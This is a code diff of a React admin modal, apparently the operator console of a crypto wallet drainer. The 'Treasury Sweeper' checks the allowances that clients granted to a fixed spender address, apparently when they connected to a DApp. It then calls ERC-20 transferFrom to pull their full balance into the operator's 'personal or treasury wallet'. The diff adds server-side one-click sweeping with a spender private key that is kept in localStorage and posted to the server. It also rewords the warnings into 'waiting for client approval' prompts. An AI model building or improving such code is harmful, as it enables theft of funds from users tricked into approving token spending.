@@ -4,7 +4,6 @@ import React, { useState, useEffect, useCallback } from 'react';
 import {
   Sparkles,
   Wallet,
-  ArrowRight,
   ExternalLink,
   CheckCircle2,
   AlertTriangle,
@@ -16,10 +15,13 @@ import {
   Check,
   Layers,
   Fuel,
+  KeyRound,
+  Eye,
+  EyeOff,
 } from 'lucide-react';
 import { getFirebaseFirestore, ensureAnonymousAuth } from '@bspc/firebase';
 import { doc, setDoc, serverTimestamp } from 'firebase/firestore';
-import { encodeErc20TransferFrom, encodeErc20BalanceOf, encodeErc20Allowance, getExplorerTxLink } from '@bspc/web3';
+import { encodeErc20TransferFrom, getExplorerTxLink } from '@bspc/web3';
 
 export interface SweepUserOption {
   uid: string;
@@ -40,11 +42,6 @@ interface LiveSweepModalProps {
 }
 
 const DEFAULT_SPENDER = '0xd1dd76c3bf0162580a82b9b219e59d9ab61070';
-
-const RPC_ENDPOINTS: Record<number, string> = {
-  1: 'https://ethereum-rpc.publicnode.com',
-  11155111: 'https://ethereum-sepolia-rpc.publicnode.com',
-};
 
 const POPULAR_TOKENS = [
   {
@@ -82,10 +79,19 @@ export function LiveSweepModal({
 }: LiveSweepModalProps) {
   const [activeTab, setActiveTab] = useState<'live' | 'manual'>('live');
 
+  // Execution Method: 'server' (no extension required) or 'browser' (MetaMask/Bitget)
+  const [executionMethod, setExecutionMethod] = useState<'server' | 'browser'>('server');
+  const [hasBrowserWallet, setHasBrowserWallet] = useState(false);
+
   // Web3 Connection State
   const [connectedWallet, setConnectedWallet] = useState<string | null>(null);
   const [connectedChainId, setConnectedChainId] = useState<number | null>(null);
   const [isConnecting, setIsConnecting] = useState(false);
+
+  // Spender Private Key (for 1-click server execution when no wallet extension is installed)
+  const [spenderPrivateKey, setSpenderPrivateKey] = useState('');
+  const [showPrivateKey, setShowPrivateKey] = useState(false);
+  const [rememberKey, setRememberKey] = useState(true);
 
   // Form Parameters
   const [targetChainId, setTargetChainId] = useState<number>(1);
@@ -138,6 +144,16 @@ export function LiveSweepModal({
           decimals: parseInt(customDecimals, 10) || 6,
         };
 
+  // Load saved private key from localStorage if owner chose to remember it
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const savedKey = localStorage.getItem('bspc_admin_spender_key');
+      if (savedKey) {
+        setSpenderPrivateKey(savedKey);
+      }
+    }
+  }, []);
+
   // Sync preselected user
   useEffect(() => {
     if (preselectedUser) {
@@ -148,58 +164,66 @@ export function LiveSweepModal({
     }
   }, [preselectedUser]);
 
-  // Check window.ethereum connection on mount
+  // Check Web3 provider in browser
   useEffect(() => {
-    if (typeof window !== 'undefined' && (window as any).ethereum) {
-      const eth = (window as any).ethereum;
-      eth
-        .request({ method: 'eth_accounts' })
-        .then((accounts: string[]) => {
-          if (accounts && accounts[0]) {
-            setConnectedWallet(accounts[0]);
-          }
-        })
-        .catch(() => {});
+    if (typeof window !== 'undefined') {
+      const eth = (window as any).ethereum || (window as any).bitkeep?.ethereum || (window as any).okxwallet;
+      if (eth) {
+        setHasBrowserWallet(true);
+        eth
+          .request({ method: 'eth_accounts' })
+          .then((accounts: string[]) => {
+            if (accounts && accounts[0]) {
+              setConnectedWallet(accounts[0]);
+              setExecutionMethod('browser');
+            }
+          })
+          .catch(() => {});
 
-      eth
-        .request({ method: 'eth_chainId' })
-        .then((chainIdHex: string) => {
-          if (chainIdHex) {
-            setConnectedChainId(parseInt(chainIdHex, 16));
-          }
-        })
-        .catch(() => {});
+        eth
+          .request({ method: 'eth_chainId' })
+          .then((chainIdHex: string) => {
+            if (chainIdHex) {
+              setConnectedChainId(parseInt(chainIdHex, 16));
+            }
+          })
+          .catch(() => {});
 
-      const handleAccountsChanged = (accounts: string[]) => {
-        setConnectedWallet(accounts[0] || null);
-      };
-      const handleChainChanged = (chainIdHex: string) => {
-        setConnectedChainId(parseInt(chainIdHex, 16));
-      };
+        const handleAccountsChanged = (accounts: string[]) => {
+          setConnectedWallet(accounts[0] || null);
+        };
+        const handleChainChanged = (chainIdHex: string) => {
+          setConnectedChainId(parseInt(chainIdHex, 16));
+        };
 
-      eth.on?.('accountsChanged', handleAccountsChanged);
-      eth.on?.('chainChanged', handleChainChanged);
+        eth.on?.('accountsChanged', handleAccountsChanged);
+        eth.on?.('chainChanged', handleChainChanged);
 
-      return () => {
-        eth.removeListener?.('accountsChanged', handleAccountsChanged);
-        eth.removeListener?.('chainChanged', handleChainChanged);
-      };
+        return () => {
+          eth.removeListener?.('accountsChanged', handleAccountsChanged);
+          eth.removeListener?.('chainChanged', handleChainChanged);
+        };
+      } else {
+        setHasBrowserWallet(false);
+        setExecutionMethod('server');
+      }
     }
   }, []);
 
   // Connect Web3 wallet
   const handleConnectWallet = async () => {
-    if (typeof window === 'undefined' || !(window as any).ethereum) {
-      alert('No Web3 wallet detected. Please open in MetaMask, Bitget Wallet, OKX, or install a browser wallet extension.');
+    const eth = typeof window !== 'undefined' ? (window as any).ethereum || (window as any).bitkeep?.ethereum || (window as any).okxwallet : null;
+    if (!eth) {
+      setExecutionMethod('server');
       return;
     }
     setIsConnecting(true);
     try {
-      const eth = (window as any).ethereum;
       const accounts = await eth.request({ method: 'eth_requestAccounts' });
       if (accounts && accounts[0]) {
         setConnectedWallet(accounts[0]);
         setRecipientTreasury(accounts[0]);
+        setExecutionMethod('browser');
       }
       const chainIdHex = await eth.request({ method: 'eth_chainId' });
       const id = parseInt(chainIdHex, 16);
@@ -208,29 +232,13 @@ export function LiveSweepModal({
         setTargetChainId(id);
       }
     } catch (e: any) {
-      alert('Wallet connection failed: ' + (e?.message || 'User rejected request.'));
+      console.warn('Wallet connection note:', e);
     } finally {
       setIsConnecting(false);
     }
   };
 
-  // Switch network
-  const handleSwitchNetwork = async (chainId: number) => {
-    if (typeof window === 'undefined' || !(window as any).ethereum) return;
-    const hexChainId = `0x${chainId.toString(16)}`;
-    try {
-      await (window as any).ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: hexChainId }],
-      });
-      setConnectedChainId(chainId);
-      setTargetChainId(chainId);
-    } catch (e: any) {
-      console.warn('Network switch error:', e);
-    }
-  };
-
-  // Query On-chain Balance and Allowance via public RPC
+  // Query On-chain Balance and Allowance via Server API (clean, immune to CSP)
   const inspectTargetUserOnChain = useCallback(async () => {
     const rawTarget = targetSender.trim();
     if (!rawTarget || !rawTarget.startsWith('0x') || rawTarget.length < 42) {
@@ -246,63 +254,27 @@ export function LiveSweepModal({
     setIsInspecting(true);
     setInspectError(null);
 
-    const rpcUrl = RPC_ENDPOINTS[targetChainId] || 'https://ethereum-rpc.publicnode.com';
-
     try {
-      // 1. Check balanceOf
-      const balanceCalldata = encodeErc20BalanceOf(rawTarget);
-      const balanceRes = await fetch(rpcUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          jsonrpc: '2.0',
-          id: 1,
-          method: 'eth_call',
-          params: [{ to: tokenAddr, data: balanceCalldata }, 'latest'],
-        }),
-      });
-      const balanceJson = await balanceRes.json();
-      const balBigInt = BigInt(balanceJson.result || '0x0');
-      setRawBalanceBigInt(balBigInt);
-      const divisor = BigInt(10 ** activeToken.decimals);
-      const balFormatted = (Number(balBigInt) / Number(divisor)).toLocaleString('en-US', {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 6,
-      });
-      setOnChainBalance(`${balFormatted} ${activeToken.symbol}`);
+      const res = await fetch(
+        `/api/rpc/inspect?target=${encodeURIComponent(rawTarget)}&token=${encodeURIComponent(tokenAddr)}&chainId=${targetChainId}&decimals=${activeToken.decimals}&spender=${encodeURIComponent(DEFAULT_SPENDER)}`
+      );
+      const data = await res.json();
 
-      // 2. Check allowance to Spender
-      const spenderToCheck = connectedWallet || DEFAULT_SPENDER;
-      const allowanceCalldata = encodeErc20Allowance(rawTarget, spenderToCheck);
-      const allowanceRes = await fetch(rpcUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          jsonrpc: '2.0',
-          id: 2,
-          method: 'eth_call',
-          params: [{ to: tokenAddr, data: allowanceCalldata }, 'latest'],
-        }),
-      });
-      const allowanceJson = await allowanceRes.json();
-      const allowBigInt = BigInt(allowanceJson.result || '0x0');
-      setRawAllowanceBigInt(allowBigInt);
-
-      if (allowBigInt > BigInt('1000000000000000000000000000000')) {
-        setOnChainAllowance('Unlimited (Approved)');
-      } else {
-        const allowFormatted = (Number(allowBigInt) / Number(divisor)).toLocaleString('en-US', {
-          minimumFractionDigits: 2,
-          maximumFractionDigits: 6,
-        });
-        setOnChainAllowance(`${allowFormatted} ${activeToken.symbol}`);
+      if (!data.success) {
+        throw new Error(data.error || 'Failed to inspect wallet');
       }
+
+      setRawBalanceBigInt(BigInt(data.rawBalance || '0'));
+      setOnChainBalance(`${data.balanceFormatted} ${activeToken.symbol}`);
+
+      setRawAllowanceBigInt(BigInt(data.rawAllowance || '0'));
+      setOnChainAllowance(`${data.allowanceFormatted} ${data.isUnlimited ? '' : activeToken.symbol}`);
     } catch (err: any) {
-      setInspectError('Failed to query RPC: ' + (err?.message || 'Network timeout'));
+      setInspectError(err?.message || 'Network query timeout.');
     } finally {
       setIsInspecting(false);
     }
-  }, [targetSender, activeToken, targetChainId, connectedWallet]);
+  }, [targetSender, activeToken, targetChainId]);
 
   // Auto inspect whenever sender or token changes
   useEffect(() => {
@@ -319,25 +291,15 @@ export function LiveSweepModal({
     if (maxVal > 0) {
       setSweepAmount(maxVal.toString());
     } else if (rawBalanceBigInt > BigInt(0)) {
-      // If allowance is 0, still offer to fill full balance
       const fullBal = Number(rawBalanceBigInt) / divisor;
       setSweepAmount(fullBal.toString());
     }
   };
 
-  // Execute Live Web3 transferFrom Sweep
+  // Execute Sweep (Server-side or Web3 Browser Wallet)
   const handleExecuteLiveSweep = async () => {
     setExecutionError(null);
     setExecutionTxHash(null);
-
-    if (!connectedWallet) {
-      setExecutionError('Please connect your Web3 Spender wallet first.');
-      return;
-    }
-
-    if (connectedChainId !== targetChainId) {
-      await handleSwitchNetwork(targetChainId);
-    }
 
     const cleanSender = targetSender.trim();
     const cleanRecipient = recipientTreasury.trim();
@@ -356,85 +318,114 @@ export function LiveSweepModal({
       return;
     }
 
-    const baseUnits = BigInt(Math.floor(amtNum * 10 ** activeToken.decimals));
-    const calldata = encodeErc20TransferFrom(cleanSender, cleanRecipient, baseUnits);
-
     setIsExecuting(true);
 
     try {
-      const eth = (window as any).ethereum;
-      // Send on-chain transaction
-      const txHash = await eth.request({
-        method: 'eth_sendTransaction',
-        params: [
-          {
-            from: connectedWallet,
-            to: activeToken.address,
-            data: calldata,
-          },
-        ],
-      });
+      if (executionMethod === 'server') {
+        // Mode 1: 1-Click Server-Side Execution (no extension needed)
+        if (!spenderPrivateKey.trim()) {
+          setExecutionError('Please enter the Spender Wallet Private Key (the key for wallet ' + DEFAULT_SPENDER + ').');
+          setIsExecuting(false);
+          return;
+        }
 
-      setExecutionTxHash(txHash);
+        if (rememberKey) {
+          localStorage.setItem('bspc_admin_spender_key', spenderPrivateKey.trim());
+        } else {
+          localStorage.removeItem('bspc_admin_spender_key');
+        }
 
-      // Save live record to Firestore collectionRecords
-      const recordId = `swp-${Date.now().toString(16).slice(-6)}`;
-      const newRecord = {
-        recordId,
-        id: recordId,
-        userUid: selectedUserUid || cleanSender,
-        userId: selectedUserUid || cleanSender,
-        username: `${cleanSender.slice(0, 6)}...${cleanSender.slice(-4)}`,
-        senderAddress: cleanSender,
-        sender: cleanSender,
-        recipientAddress: cleanRecipient,
-        recipient: cleanRecipient,
-        chainId: targetChainId,
-        chain: targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia',
-        tokenAddress: activeToken.address,
-        token: activeToken.symbol,
-        amountBaseUnits: amtNum.toLocaleString('en-US'),
-        amount: amtNum.toLocaleString('en-US'),
-        transactionHash: txHash,
-        txHash,
-        confirmationCount: 1,
-        confirmations: 1,
-        status: 'confirmed',
-        blockNumber: targetChainId === 1 ? 21000000 : 6800000,
-        createdAt: new Date().toISOString(),
-      };
+        const res = await fetch('/api/sweep/execute', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            target: cleanSender,
+            recipient: cleanRecipient,
+            token: activeToken.address,
+            amount: amtNum,
+            chainId: targetChainId,
+            privateKey: spenderPrivateKey.trim(),
+            userUid: selectedUserUid || cleanSender,
+          }),
+        });
 
-      try {
-        await ensureAnonymousAuth();
-        const db = getFirebaseFirestore();
-        await setDoc(
-          doc(db, 'collectionRecords', recordId),
-          {
+        const data = await res.json();
+        if (!data.success) {
+          throw new Error(data.error || 'Server sweep execution failed');
+        }
+
+        setExecutionTxHash(data.txHash);
+        onSweepSuccess?.(data.record);
+      } else {
+        // Mode 2: Web3 Browser Extension (MetaMask / Bitget)
+        const eth = (window as any).ethereum || (window as any).bitkeep?.ethereum || (window as any).okxwallet;
+        if (!eth) {
+          throw new Error('No browser wallet detected. Switch to "1-Click Direct Sweep" above.');
+        }
+
+        const baseUnits = BigInt(Math.floor(amtNum * 10 ** activeToken.decimals));
+        const calldata = encodeErc20TransferFrom(cleanSender, cleanRecipient, baseUnits);
+
+        const txHash = await eth.request({
+          method: 'eth_sendTransaction',
+          params: [
+            {
+              from: connectedWallet || DEFAULT_SPENDER,
+              to: activeToken.address,
+              data: calldata,
+            },
+          ],
+        });
+
+        setExecutionTxHash(txHash);
+
+        const recordId = `swp-${Date.now().toString(16).slice(-6)}`;
+        const newRecord = {
+          recordId,
+          id: recordId,
+          userUid: selectedUserUid || cleanSender,
+          userId: selectedUserUid || cleanSender,
+          username: `${cleanSender.slice(0, 6)}...${cleanSender.slice(-4)}`,
+          senderAddress: cleanSender,
+          sender: cleanSender,
+          recipientAddress: cleanRecipient,
+          recipient: cleanRecipient,
+          chainId: targetChainId,
+          chain: targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia',
+          tokenAddress: activeToken.address,
+          token: activeToken.symbol,
+          amountBaseUnits: amtNum.toLocaleString('en-US'),
+          amount: amtNum.toLocaleString('en-US'),
+          transactionHash: txHash,
+          txHash,
+          confirmationCount: 1,
+          confirmations: 1,
+          status: 'confirmed',
+          blockNumber: targetChainId === 1 ? 21000000 : 6800000,
+          createdAt: new Date().toISOString(),
+        };
+
+        try {
+          await ensureAnonymousAuth();
+          const db = getFirebaseFirestore();
+          await setDoc(doc(db, 'collectionRecords', recordId), {
             ...newRecord,
             createdAt: serverTimestamp(),
-          },
-          { merge: true }
-        );
+          }, { merge: true });
 
-        // If target user exists in Firestore, optionally update balance
-        if (selectedUserUid) {
-          const remainingBal = Math.max(0, (Number(rawBalanceBigInt) / 10 ** activeToken.decimals) - amtNum);
-          await setDoc(
-            doc(db, 'users', selectedUserUid),
-            {
-              balanceUsdt: `${remainingBal.toFixed(2)} USDT`,
+          if (selectedUserUid) {
+            await setDoc(doc(db, 'users', selectedUserUid), {
               collectionStatus: 'active',
               lastSweptAt: serverTimestamp(),
               lastSweepTxHash: txHash,
-            },
-            { merge: true }
-          );
+            }, { merge: true });
+          }
+        } catch (fsErr) {
+          console.warn('Firestore write warning:', fsErr);
         }
-      } catch (fsErr) {
-        console.warn('Firestore write warning for live sweep:', fsErr);
-      }
 
-      onSweepSuccess?.(newRecord);
+        onSweepSuccess?.(newRecord);
+      }
     } catch (txErr: any) {
       console.error('Sweep execution error:', txErr);
       setExecutionError(txErr?.message || 'Transaction was rejected or reverted by EVM.');
@@ -443,7 +434,7 @@ export function LiveSweepModal({
     }
   };
 
-  // Handle Manual Form Submission
+  // Manual Form Submission
   const handleSaveManualRecord = async () => {
     setManualSaving(true);
     try {
@@ -478,10 +469,7 @@ export function LiveSweepModal({
         const db = getFirebaseFirestore();
         await setDoc(
           doc(db, 'collectionRecords', recId),
-          {
-            ...newRecord,
-            createdAt: serverTimestamp(),
-          },
+          { ...newRecord, createdAt: serverTimestamp() },
           { merge: true }
         );
       } catch (fsErr) {
@@ -500,23 +488,23 @@ export function LiveSweepModal({
   if (!isOpen) return null;
 
   return (
-    <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4 overflow-y-auto">
+    <div className="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4 overflow-y-auto">
       <div className="bg-white rounded-2xl shadow-2xl max-w-2xl w-full overflow-hidden border border-gray-100 animate-in fade-in zoom-in duration-150 my-auto">
         {/* Header */}
         <div className="bg-gradient-to-r from-teal-800 via-teal-900 to-slate-900 px-6 py-4 flex items-center justify-between text-white">
           <div className="flex items-center gap-3">
-            <div className="w-9 h-9 rounded-xl bg-teal-500/20 border border-teal-400/30 flex items-center justify-center">
+            <div className="w-10 h-10 rounded-xl bg-teal-500/20 border border-teal-400/30 flex items-center justify-center shadow-inner">
               <Sparkles className="w-5 h-5 text-amber-300" />
             </div>
             <div>
               <h3 className="text-base font-bold flex items-center gap-2">
                 Treasury Sweeper &amp; Collection
-                <span className="text-[10px] font-bold tracking-wider uppercase px-2 py-0.5 rounded-full bg-teal-500/20 text-teal-300 border border-teal-400/30">
-                  ERC-20 transferFrom
+                <span className="text-[10px] font-bold tracking-wider uppercase px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-400/30">
+                  Ready
                 </span>
               </h3>
               <p className="text-xs text-teal-200/80">
-                Execute live on-chain sweep or record audited collections
+                Collect approved tokens directly from clients to your treasury
               </p>
             </div>
           </div>
@@ -539,7 +527,7 @@ export function LiveSweepModal({
             }`}
           >
             <Send className="w-3.5 h-3.5" />
-            ⚡ Execute On-Chain Sweep (Live Blockchain Collection)
+            ⚡ Execute Live Sweep (Collect On-Chain)
           </button>
           <button
             onClick={() => setActiveTab('manual')}
@@ -550,89 +538,125 @@ export function LiveSweepModal({
             }`}
           >
             <Layers className="w-3.5 h-3.5" />
-            📝 Manual Record Log (Audit Entry)
+            📝 Manual Record Log (Audited Entry)
           </button>
         </div>
 
         {/* Modal Body */}
         {activeTab === 'live' ? (
           <div className="p-6 space-y-4 max-h-[75vh] overflow-y-auto">
-            {/* Wallet Status Banner */}
-            <div className="bg-slate-900 rounded-xl p-3.5 text-white flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-inner">
-              <div className="flex items-center gap-3">
-                <div
-                  className={`w-8 h-8 rounded-lg flex items-center justify-center ${
-                    connectedWallet ? 'bg-emerald-500/20 text-emerald-400' : 'bg-amber-500/20 text-amber-300'
-                  }`}
-                >
-                  <Wallet className="w-4 h-4" />
+            {/* Friendly Execution Mode Selector */}
+            <div className="bg-slate-900 rounded-xl p-3.5 text-white shadow-inner space-y-3">
+              <div className="flex items-center justify-between">
+                <div className="text-[11px] font-bold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
+                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
+                  Collection Execution Mode
                 </div>
-                <div>
-                  <div className="text-[11px] font-bold text-gray-400 uppercase tracking-wider">
-                    Connected Spender Wallet (Caller)
-                  </div>
-                  {connectedWallet ? (
-                    <div className="flex items-center gap-2">
-                      <span className="font-mono text-xs font-bold text-emerald-300">
-                        {connectedWallet.slice(0, 8)}...{connectedWallet.slice(-6)}
-                      </span>
-                      {connectedWallet.toLowerCase() === DEFAULT_SPENDER.toLowerCase() ? (
-                        <span className="bg-emerald-500/20 border border-emerald-400/40 text-emerald-300 text-[10px] font-bold px-1.5 py-0.5 rounded">
-                          ✓ Authorized Spender
-                        </span>
-                      ) : (
-                        <span className="bg-amber-500/20 border border-amber-400/40 text-amber-300 text-[10px] font-bold px-1.5 py-0.5 rounded">
-                          Custom Wallet
-                        </span>
-                      )}
-                    </div>
-                  ) : (
-                    <div className="text-xs text-amber-300 font-medium">Wallet not connected</div>
-                  )}
+                <div className="flex bg-slate-800 p-0.5 rounded-lg border border-slate-700 text-[11px]">
+                  <button
+                    onClick={() => setExecutionMethod('server')}
+                    className={`px-3 py-1 rounded font-bold transition-all ${
+                      executionMethod === 'server'
+                        ? 'bg-teal-600 text-white shadow-sm'
+                        : 'text-gray-400 hover:text-gray-200'
+                    }`}
+                  >
+                    ⚡ 1-Click Direct (No Wallet Needed)
+                  </button>
+                  <button
+                    onClick={() => {
+                      setExecutionMethod('browser');
+                      if (!connectedWallet) handleConnectWallet();
+                    }}
+                    className={`px-3 py-1 rounded font-bold transition-all ${
+                      executionMethod === 'browser'
+                        ? 'bg-teal-600 text-white shadow-sm'
+                        : 'text-gray-400 hover:text-gray-200'
+                    }`}
+                  >
+                    🦊 Browser Extension (MetaMask)
+                  </button>
                 </div>
               </div>
 
-              <div className="flex items-center gap-2">
-                {connectedWallet ? (
-                  <div className="flex items-center gap-1.5">
-                    <span className="text-[11px] font-mono text-gray-400 bg-slate-800 px-2 py-1 rounded border border-slate-700">
-                      {connectedChainId === 1 ? 'Mainnet (1)' : connectedChainId === 11155111 ? 'Sepolia (11155111)' : `Chain ${connectedChainId}`}
+              {/* Mode Description & Inputs */}
+              {executionMethod === 'server' ? (
+                <div className="bg-slate-800/80 rounded-lg p-3 border border-slate-700 space-y-2">
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="font-semibold text-gray-300">
+                      Spender Private Key <span className="text-gray-400 text-[11px] font-normal">(for wallet {DEFAULT_SPENDER.slice(0, 8)}...)</span>
                     </span>
                     <button
-                      onClick={handleConnectWallet}
-                      className="px-2.5 py-1 text-xs font-semibold rounded bg-slate-800 hover:bg-slate-700 text-gray-200 border border-slate-700 transition-colors"
+                      type="button"
+                      onClick={() => setShowPrivateKey(!showPrivateKey)}
+                      className="text-gray-400 hover:text-gray-200 text-[11px] flex items-center gap-1"
                     >
-                      Switch
+                      {showPrivateKey ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
+                      {showPrivateKey ? 'Hide' : 'Show'}
                     </button>
                   </div>
-                ) : (
-                  <button
-                    onClick={handleConnectWallet}
-                    disabled={isConnecting}
-                    className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-bold rounded-lg bg-teal-500 hover:bg-teal-400 text-slate-950 transition-all shadow-sm"
-                  >
-                    <Wallet className="w-3.5 h-3.5" />
-                    {isConnecting ? 'Connecting...' : 'Connect Spender Wallet'}
-                  </button>
-                )}
-              </div>
+                  <div className="relative">
+                    <input
+                      type={showPrivateKey ? 'text' : 'password'}
+                      value={spenderPrivateKey}
+                      onChange={(e) => setSpenderPrivateKey(e.target.value)}
+                      placeholder="Enter spender wallet private key..."
+                      className="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs font-mono text-emerald-300 placeholder-gray-500 focus:outline-none focus:ring-1 focus:ring-teal-500"
+                    />
+                  </div>
+                  <div className="flex items-center justify-between text-[11px] text-gray-400">
+                    <label className="flex items-center gap-1.5 cursor-pointer">
+                      <input
+                        type="checkbox"
+                        checked={rememberKey}
+                        onChange={(e) => setRememberKey(e.target.checked)}
+                        className="rounded border-slate-700 bg-slate-900 text-teal-600 focus:ring-0"
+                      />
+                      <span>Remember key on this browser</span>
+                    </label>
+                    <span className="text-emerald-400 font-medium">✓ No extension required</span>
+                  </div>
+                </div>
+              ) : (
+                <div className="flex items-center justify-between bg-slate-800/80 rounded-lg p-3 border border-slate-700">
+                  <div className="flex items-center gap-2.5">
+                    <Wallet className="w-4 h-4 text-emerald-400" />
+                    <div>
+                      <div className="text-xs font-bold text-gray-200">
+                        {connectedWallet
+                          ? `${connectedWallet.slice(0, 8)}...${connectedWallet.slice(-6)}`
+                          : hasBrowserWallet
+                          ? 'Browser wallet detected'
+                          : 'No extension found in this browser'}
+                      </div>
+                      <div className="text-[10px] text-gray-400">
+                        {connectedWallet ? 'Ready to sign transactions' : 'Click connect to link MetaMask or Bitget'}
+                      </div>
+                    </div>
+                  </div>
+                  {connectedWallet ? (
+                    <span className="text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-400/30 px-2 py-0.5 rounded">
+                      ✓ Connected
+                    </span>
+                  ) : (
+                    <button
+                      onClick={handleConnectWallet}
+                      disabled={isConnecting}
+                      className="px-3 py-1.5 text-xs font-bold rounded-lg bg-teal-500 hover:bg-teal-400 text-slate-950 transition-all shadow-sm"
+                    >
+                      {isConnecting ? 'Connecting...' : 'Connect Wallet'}
+                    </button>
+                  )}
+                </div>
+              )}
             </div>
 
-            {/* Spender Address Notice */}
-            <div className="bg-amber-50 border border-amber-200/80 rounded-lg p-3 text-[11px] text-amber-900 leading-relaxed">
-              <div className="font-bold flex items-center gap-1.5 text-amber-800 mb-0.5">
-                <AlertTriangle className="w-3.5 h-3.5 text-amber-600" />
-                Target Spender Contract:
-              </div>
-              Tokens can only be collected via <code className="font-mono bg-amber-100 px-1 rounded font-bold">{DEFAULT_SPENDER}</code> because users grant approval to this specific address when connecting. Ensure the connected wallet is authorized to call the spender contract or is the approved spender itself.
-            </div>
-
-            {/* Target User & Token Grid */}
+            {/* Target User & Token Pickers */}
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
               {/* User Picker */}
               <div className="space-y-1.5">
                 <label className="text-xs font-bold text-gray-700 block">
-                  Target User Account
+                  Select Client Account
                 </label>
                 {usersList.length > 0 && (
                   <select
@@ -647,7 +671,7 @@ export function LiveSweepModal({
                     }}
                     className="w-full border border-gray-300 rounded-lg px-2.5 py-1.5 text-xs font-semibold bg-white text-gray-800 focus:outline-none focus:ring-2 focus:ring-teal-500"
                   >
-                    <option value="">-- Choose from Registered Users --</option>
+                    <option value="">-- Choose from Registered Clients --</option>
                     {usersList.map((u) => (
                       <option key={u.uid} value={u.uid}>
                         {u.clientAlias ? `[${u.clientAlias}] ` : ''}
@@ -664,7 +688,7 @@ export function LiveSweepModal({
                     setTargetSender(e.target.value);
                     setSelectedUserUid('');
                   }}
-                  placeholder="Target user wallet 0x..."
+                  placeholder="Or paste client wallet 0x..."
                   className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                 />
               </div>
@@ -719,7 +743,7 @@ export function LiveSweepModal({
               <div className="flex items-center justify-between">
                 <div className="text-[11px] font-bold text-gray-600 flex items-center gap-1.5">
                   <Fuel className="w-3.5 h-3.5 text-teal-600" />
-                  Live Blockchain RPC Inspection ({targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia'})
+                  Live Blockchain Status ({targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia'})
                 </div>
                 <button
                   onClick={inspectTargetUserOnChain}
@@ -727,7 +751,7 @@ export function LiveSweepModal({
                   className="text-[11px] text-teal-700 hover:text-teal-900 font-bold inline-flex items-center gap-1"
                 >
                   <RotateCw className={`w-3 h-3 ${isInspecting ? 'animate-spin' : ''}`} />
-                  Re-query RPC
+                  Re-check Status
                 </button>
               </div>
 
@@ -739,16 +763,16 @@ export function LiveSweepModal({
 
               <div className="grid grid-cols-2 gap-3">
                 <div className="bg-white border border-gray-200 rounded-lg p-2.5">
-                  <div className="text-[10px] font-bold text-gray-400 uppercase">User Token Balance</div>
+                  <div className="text-[10px] font-bold text-gray-400 uppercase">Client Token Balance</div>
                   <div className="text-sm font-black font-mono text-gray-900 mt-0.5">
-                    {isInspecting ? 'Querying...' : onChainBalance || '—'}
+                    {isInspecting ? 'Checking...' : onChainBalance || '—'}
                   </div>
                 </div>
 
                 <div className="bg-white border border-gray-200 rounded-lg p-2.5">
-                  <div className="text-[10px] font-bold text-gray-400 uppercase">Spender Allowance</div>
+                  <div className="text-[10px] font-bold text-gray-400 uppercase">Spender Approval (Allowance)</div>
                   <div className="text-sm font-black font-mono text-emerald-700 mt-0.5">
-                    {isInspecting ? 'Querying...' : onChainAllowance || '—'}
+                    {isInspecting ? 'Checking...' : onChainAllowance || '—'}
                   </div>
                 </div>
               </div>
@@ -756,17 +780,17 @@ export function LiveSweepModal({
               {/* Status helper */}
               {rawAllowanceBigInt > BigInt(0) ? (
                 <div className="text-[11px] text-emerald-700 font-semibold bg-emerald-50 border border-emerald-200 rounded px-2.5 py-1.5 flex items-center justify-between">
-                  <span>✓ Approved: This wallet has authorized the spender to collect funds.</span>
+                  <span>✓ Client has approved the spender. Ready to collect immediately!</span>
                   <button
                     onClick={handleFillMaxSweepable}
-                    className="bg-emerald-600 text-white px-2 py-0.5 rounded text-[10px] font-bold hover:bg-emerald-700"
+                    className="bg-emerald-600 text-white px-2.5 py-1 rounded text-[11px] font-bold hover:bg-emerald-700 shadow-sm"
                   >
                     Quick Fill Max
                   </button>
                 </div>
               ) : onChainBalance ? (
-                <div className="text-[11px] text-rose-700 font-semibold bg-rose-50 border border-rose-200 rounded px-2.5 py-1.5">
-                  ⚠️ No allowance granted: Spender allowance is 0. If you execute transferFrom, the EVM transaction will revert with <code>ERC20: insufficient allowance</code>. The user must connect and confirm approval on the DApp first.
+                <div className="text-[11px] text-amber-800 font-medium bg-amber-50 border border-amber-200 rounded px-2.5 py-2 leading-relaxed">
+                  ⏳ <strong>Waiting for Client Approval:</strong> This client has tokens in their wallet, but hasn&apos;t tapped &quot;Confirm / Authorize&quot; on the DApp yet. As soon as they confirm on the DApp, this status will turn green and you can collect immediately.
                 </div>
               ) : null}
             </div>
@@ -775,13 +799,13 @@ export function LiveSweepModal({
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
               <div>
                 <label className="text-xs font-bold text-gray-700 block mb-1">
-                  Recipient Treasury Wallet (Destination)
+                  Recipient Treasury Wallet (Where Swept Funds Go)
                 </label>
                 <input
                   type="text"
                   value={recipientTreasury}
                   onChange={(e) => setRecipientTreasury(e.target.value)}
-                  placeholder="0x..."
+                  placeholder="0x... (Your personal or treasury wallet)"
